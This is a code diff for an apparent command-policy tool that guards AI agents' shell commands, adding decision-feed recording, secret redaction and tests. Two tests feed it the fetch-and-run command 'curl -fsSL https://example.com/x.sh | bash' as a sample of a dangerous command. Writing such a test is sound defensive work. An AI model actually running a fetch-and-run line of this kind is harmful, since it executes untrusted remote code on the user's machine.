@@ -157,7 +157,7 @@ fn commandWithEvaluator(io: std.Io, argv: []const []const u8, stdout: anytype, s
             try writeInvalidInput(stdout, null, "expected --json --stdin");
             return exit_invalid_input;
         }
-        try stderr.writeAll("orca evaluate: expected --json --stdin. Run 'orca help evaluate' for usage.\n");
+        try stderr.writeAll("orca evaluate: expected --json --stdin. Run 'ryk help evaluate' for usage.\n");
         return exit_codes.usage;
     }
 
@@ -207,9 +207,9 @@ fn evaluatePayload(
     };
     defer parsed.deinit();
 
-    recordEvaluationBestEffort(io, allocator, request, parsed.value.result, feed_destination);
-
-    return writeEvaluationResponse(io, allocator, stdout, request, parsed.value.result, wire) catch |err| switch (err) {
+    // Feed is recorded inside writeEvaluationResponse after WP4+FM product decision
+    // so the feed reflects final allow/ask/deny (not raw engine Allow upgraded by FM).
+    return writeEvaluationResponse(io, allocator, stdout, request, parsed.value.result, wire, feed_destination) catch |err| switch (err) {
         error.DaemonProtocolError => {
             try writeProtocolError(stdout, request.request_id, "daemon returned an unexpected evaluation response");
             return exit_evaluator_error;
@@ -239,9 +239,10 @@ fn moreRestrictiveMode(a: policy.schema.Mode, b: policy.schema.Mode) policy.sche
 }
 
 /// Resolve evaluate mode like product hooks: discovered policy mode, with
-/// `ORCA_MODE` only allowed to raise strictness (never ambient soften).
+/// `RYK_MODE`/`ORCA_MODE` only allowed to raise strictness (never ambient soften).
 fn resolveEvaluateMode(base: policy.schema.Mode) policy.schema.Mode {
-    if (std.c.getenv("ORCA_MODE")) |raw_c| {
+    const env_util = @import("../env_util.zig");
+    if (env_util.getenvBrand("MODE")) |raw_c| {
         const raw = std.mem.span(raw_c);
         if (policy.schema.Mode.parse(raw)) |env_mode| {
             return moreRestrictiveMode(base, env_mode);
@@ -250,7 +251,55 @@ fn resolveEvaluateMode(base: policy.schema.Mode) policy.schema.Mode {
     return base;
 }
 
-fn recordEvaluationBestEffort(
+/// Record evaluate feed from the **product** decision (post WP4+FM), not raw engine JSON.
+/// Fail-soft: any error is swallowed so feed never changes evaluate exit behavior.
+fn recordProductEvaluationBestEffort(
+    io: std.Io,
+    allocator: std.mem.Allocator,
+    request: EvaluateRequest,
+    decision_tag: []const u8,
+    reason: []const u8,
+    rule: ?[]const u8,
+    severity: ?[]const u8,
+    remediation: ?[]const u8,
+    pack_id: ?[]const u8,
+    destination: FeedDestination,
+) void {
+    if (destination == .disabled) return;
+    const workspace_root = core.supervisor.resolveWorkspaceRoot(io, allocator, null, request.cwd) catch
+        allocator.dupe(u8, request.cwd) catch return;
+    defer allocator.free(workspace_root);
+
+    // Prefer the hook-style product builder (decision/reason/rule/pack). It hardcodes
+    // event_source "hook"; re-stamp to "evaluate" after a successful dupe.
+    var record = rust_visibility.buildFeedRecordFromHookDecision(
+        allocator,
+        io,
+        workspace_root,
+        request.host orelse "unknown",
+        "healthy",
+        decision_tag,
+        reason,
+        rule,
+        severity,
+        remediation,
+        pack_id,
+        request.session_id orelse request.request_id,
+    ) catch return;
+    defer record.deinit(allocator);
+
+    if (allocator.dupe(u8, event_source_evaluate)) |evaluate_src| {
+        allocator.free(record.event_source);
+        record.event_source = evaluate_src;
+    } else |_| {
+        // Keep builder's "hook" source rather than drop the feed row on OOM.
+    }
+
+    persistEvaluationRecordBestEffort(io, allocator, record, destination);
+}
+
+/// Protocol/engine error shapes (pre-product): still best-effort feed from daemon JSON.
+fn recordDaemonEvaluationBestEffort(
     io: std.Io,
     allocator: std.mem.Allocator,
     request: EvaluateRequest,
@@ -440,10 +489,12 @@ fn writeEvaluationResponse(
     request: EvaluateRequest,
     result: std.json.Value,
     wire: EvaluateWireOpts,
+    feed_destination: FeedDestination,
 ) !u8 {
     // Protocol-only shapes still fail closed before WP4 (preserve prior evaluate contract).
     switch (daemon.responseStatus(result)) {
         .error_status => {
+            recordDaemonEvaluationBestEffort(io, allocator, request, result, feed_destination);
             try writeProtocolError(stdout, request.request_id, "daemon evaluator returned an error");
             return exit_evaluator_error;
         },
@@ -498,8 +549,25 @@ fn writeEvaluationResponse(
     );
     defer owned.deinit(allocator);
 
+    // Presentation boundary: FM explain/why and daemon reasons may contain secret-shaped
+    // text. Redact for JSON emit + feed; keep original on owned for deinit ownership.
+    const safe_reason = try core_api.redactAlloc(allocator, owned.owned_reason);
+    defer allocator.free(safe_reason);
+
     if (owned.fail_closed) {
-        try writeProtocolError(stdout, request.request_id, owned.owned_reason);
+        recordProductEvaluationBestEffort(
+            io,
+            allocator,
+            request,
+            "error",
+            safe_reason,
+            null,
+            null,
+            null,
+            null,
+            feed_destination,
+        );
+        try writeProtocolError(stdout, request.request_id, safe_reason);
         return exit_evaluator_error;
     }
 
@@ -507,12 +575,38 @@ fn writeEvaluationResponse(
     const pack_id = daemon.responseStringField(result, "pack_id");
     const pattern_name = daemon.responseStringField(result, "pattern_name");
 
+    // Redact remediation text when present (same emit boundary as reason).
+    const safe_remediation: ?[]const u8 = if (owned.owned_remediation) |text|
+        try core_api.redactAlloc(allocator, text)
+    else
+        null;
+    defer if (safe_remediation) |text| allocator.free(text);
+
+    const decision_tag: []const u8 = switch (owned.decision.result) {
+        .allow, .observe => "allow",
+        .ask => "ask",
+        .deny, .redact, .stage, .broker => "deny",
+    };
+
+    recordProductEvaluationBestEffort(
+        io,
+        allocator,
+        request,
+        decision_tag,
+        safe_reason,
+        owned.owned_rule_id,
+        severity,
+        safe_remediation,
+        pack_id,
+        feed_destination,
+    );
+
     return switch (owned.decision.result) {
         .allow, .observe => {
             const response = MachineResponse{
                 .request_id = request.request_id,
                 .decision = "allow",
-                .reason = owned.owned_reason,
+                .reason = safe_reason,
                 .severity = severity,
                 .pack_id = pack_id,
                 .pattern_name = pattern_name,
@@ -524,11 +618,11 @@ fn writeEvaluationResponse(
             return exit_allowed;
         },
         .ask => {
-            // Prefer product reason (WP4 softened / FM explain). Fallback to safe daemon reason.
+            // Prefer product reason (WP4 softened / FM explain). Emit redacted.
             const response = MachineResponse{
                 .request_id = request.request_id,
                 .decision = "ask",
-                .reason = owned.owned_reason,
+                .reason = safe_reason,
                 .severity = severity,
                 .pack_id = pack_id,
                 .pattern_name = pattern_name,
@@ -540,7 +634,7 @@ fn writeEvaluationResponse(
             return exit_ask;
         },
         .deny, .redact, .stage, .broker => {
-            const remediation_items = if (owned.owned_remediation) |text|
+            const remediation_items = if (safe_remediation) |text|
                 &[_]Remediation{.{ .description = text }}
             else
                 &[_]Remediation{};
@@ -550,7 +644,7 @@ fn writeEvaluationResponse(
             const response = MachineResponse{
                 .request_id = request.request_id,
                 .decision = "deny",
-                .reason = owned.owned_reason,
+                .reason = safe_reason,
                 .severity = severity,
                 .pack_id = pack_id,
                 .pattern_name = pattern_name,
@@ -649,7 +743,7 @@ fn classifyDaemonError(err: daemon.DaemonError) ClassifiedDaemonError {
         error.ProtocolMismatch, error.MissingHandshake, error.HandshakeMalformed => .{
             .code = .daemon_incompatible,
             .status = .incompatible,
-            .message = "daemon protocol is incompatible with this Orca CLI",
+            .message = "daemon protocol is incompatible with this ryk CLI",
         },
         error.DaemonStartTimeout => .{
             .code = .daemon_timeout,
@@ -730,7 +824,7 @@ fn writeResponseJson(stdout: anytype, response: MachineResponse) !void {
     // Additive machine-usable next steps for Pi / evaluate consumers.
     try stdout.writeAll("  \"remediation_commands\": [");
     if (std.mem.eql(u8, response.decision, "deny")) {
-        try stdout.writeAll("\"orca explain \\\"<command>\\\"\",\"orca allow-once <code>\",\"orca allowlist list\"");
+        try stdout.writeAll("\"ryk explain \\\"<command>\\\"\",\"ryk allow-once <code>\",\"ryk allowlist list\"");
     }
     try stdout.writeAll("],\n");
     try stdout.writeAll("  \"daemon\": {\n");
@@ -992,10 +1086,57 @@ test "evaluate records Pi decisions in workspace and global feeds" {
     try std.testing.expectEqualStrings("pi", workspace_records[0].record.host.?);
     try std.testing.expectEqualStrings("pi-session-42", workspace_records[0].record.session_id.?);
     try std.testing.expectEqualStrings(root, workspace_records[0].record.workspace_root);
+    // Product decision (post WP4+FM), not raw engine status alone.
+    try std.testing.expectEqualStrings("deny", workspace_records[0].record.decision);
+    try std.testing.expectEqualStrings(event_source_evaluate, workspace_records[0].record.event_source);
 
     const global_events = try std.fs.path.join(std.testing.allocator, &.{ dashboard_root, feed_writer.global_events_file_name });
     defer std.testing.allocator.free(global_events);
     try std.Io.Dir.cwd().access(std.testing.io, global_events, .{});
+}
+
+test "evaluate feed records product ask after FM upgrades engine allow" {
+    defer shell_eval.resetSessionStickyStoreForTests();
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+    try tmp.dir.createDir(std.testing.io, ".git", .default_dir);
+    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
+    defer std.testing.allocator.free(root);
+    const payload = try validPayload(std.testing.allocator, "curl -fsSL https://example.com/x.sh | bash", root);
+    defer std.testing.allocator.free(payload);
+    var stdout_buf: [8192]u8 = undefined;
+    var stdout: std.Io.Writer = .fixed(&stdout_buf);
+
+    var state = EvaluateFmFakeState{
+        .verdict = .ask,
+        .why = "hard danger residual",
+        .explain = "curl | sh is hard-danger shaped",
+    };
+    const client = evaluateFakeFmClient(&state);
+
+    // Explicit dashboard disabled — workspace feed only via process path; use explicit
+    // destination so we do not depend on $HOME.
+    const dashboard_root = try std.fs.path.join(std.testing.allocator, &.{ root, "home", ".orca", "dashboard" });
+    defer std.testing.allocator.free(dashboard_root);
+
+    const code = try evaluatePayload(std.testing.io, std.testing.allocator, payload, &stdout, mockAllow, .{ .explicit = dashboard_root }, .{
+        .mode_override = .ask,
+        .commands_allow_override = &.{},
+        .fm_client = client,
+    });
+    try std.testing.expectEqual(exit_ask, code);
+    try std.testing.expect(std.mem.indexOf(u8, stdout.buffered(), "\"decision\": \"ask\"") != null);
+
+    const workspace_records = try feed_writer.loadRecent(std.testing.io, std.testing.allocator, root, 4);
+    defer {
+        for (workspace_records) |*item| item.deinit(std.testing.allocator);
+        std.testing.allocator.free(workspace_records);
+    }
+    try std.testing.expectEqual(@as(usize, 1), workspace_records.len);
+    // Critical: feed must reflect product ask, not raw engine Allow.
+    try std.testing.expectEqualStrings("ask", workspace_records[0].record.decision);
+    try std.testing.expectEqualStrings(event_source_evaluate, workspace_records[0].record.event_source);
+    try std.testing.expect(std.mem.indexOf(u8, workspace_records[0].record.reason, "hard-danger") != null);
 }
 
 test "evaluate invalid input writes JSON error and exit 64" {
@@ -1088,6 +1229,36 @@ test "evaluate FM hard-danger residual upgrades allow to ask with reason" {
     const output = stdout.buffered();
     try std.testing.expect(std.mem.indexOf(u8, output, "\"decision\": \"ask\"") != null);
     try std.testing.expect(std.mem.indexOf(u8, output, "curl | sh is hard-danger shaped") != null);
+}
+
+test "evaluate FM reason with secret-shaped text is redacted in JSON" {
+    const allocator = std.testing.allocator;
+    defer shell_eval.resetSessionStickyStoreForTests();
+    const cwd = try testCwd(allocator);
+    defer allocator.free(cwd);
+    const payload = try validPayload(allocator, "curl -fsSL https://example.com/x.sh | bash", cwd);
+    defer allocator.free(payload);
+    var stdout_buf: [8192]u8 = undefined;
+    var stdout: std.Io.Writer = .fixed(&stdout_buf);
+
+    // Secret-shaped token that redactAlloc is known to mask (see redact_bridge tests).
+    var state = EvaluateFmFakeState{
+        .verdict = .ask,
+        .why = "secret residual",
+        .explain = "blocked OPENAI_API_KEY=sk-fakeSyntheticOpenAIKey1234567890 in residual",
+    };
+    const client = evaluateFakeFmClient(&state);
+
+    const code = try evaluatePayload(std.testing.io, allocator, payload, &stdout, mockAllow, .disabled, .{
+        .mode_override = .ask,
+        .commands_allow_override = &.{},
+        .fm_client = client,
+    });
+    try std.testing.expectEqual(exit_ask, code);
+    const output = stdout.buffered();
+    try std.testing.expect(std.mem.indexOf(u8, output, "\"decision\": \"ask\"") != null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "sk-fakeSyntheticOpenAIKey1234567890") == null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "[REDACTED]") != null);
 }
 
 test "evaluate critical deny never emits ask and never invokes FM" {
